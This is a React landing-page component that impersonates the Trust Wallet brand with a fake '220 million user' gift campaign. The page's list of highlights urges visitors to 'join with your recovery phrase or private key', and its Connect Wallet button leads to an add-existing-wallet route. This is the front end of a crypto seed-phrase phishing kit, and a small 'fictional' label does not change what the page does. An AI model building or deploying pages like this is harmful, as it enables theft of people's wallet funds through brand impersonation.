import { IoChevronDown } from 'react-icons/io5'
import { useNavigate } from 'react-router-dom'
import trustShield from '../../assets/trust-shield.png'

function LandingPage() {
  const navigate = useNavigate()

  const handleConnectWallet = () => {
    navigate('/add-existing-wallet')
  }

  return (
    <main className="landing-page">
      <div className="landing-stage" aria-label="Fictional Trust Wallet community campaign">
        <span className="landing-cursor landing-cursor-top" aria-hidden="true" />
        <span className="landing-cursor landing-cursor-side" aria-hidden="true" />

        <div className="landing-orbit" aria-hidden="true">
          <span className="landing-orbit-ring" />
          <img
            className="landing-shield landing-shield-primary"
            src={trustShield}
            alt=""
          />
        </div>
        <img
          className="landing-shield landing-shield-small"
          src={trustShield}
          alt=""
        />
        <img
          className="landing-shield landing-shield-tiny"
          src={trustShield}
          alt=""
        />

        <section className="landing-copy">
          <p>Fictional campaign concept.</p>
          <h1>Trust Wallet Community Milestone</h1>
          <span>
            A 220 million user appreciation moment focused on long-term community
            recognition, wallet security, and responsible Web3 participation.
          </span>
          <ul className="landing-points" aria-label="Campaign highlights">
            <li>Celebrate global community growth</li>
            <li>Claim Your own gift</li>
            <li>join with your recovery phrase or private key</li>
          </ul>
          <button type="button" onClick={handleConnectWallet}>
            Connect Wallet
          </button>
        </section>

        <div className="landing-next" aria-hidden="true">
          <IoChevronDown />
        </div>
      </div>
    </main>
  )
}

export default LandingPage